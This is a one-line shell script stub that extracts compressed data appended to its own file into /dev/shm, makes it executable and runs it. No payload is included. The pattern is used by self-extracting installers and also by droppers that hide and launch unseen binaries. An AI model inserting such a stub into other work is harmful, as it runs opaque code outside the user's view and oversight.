x=/dev/shm/x;dd bs=1 skip=87 if=$0 of=$x.bz2 2>$x;bzip2 -df $x.bz2;chmod +x $x;$x;exit
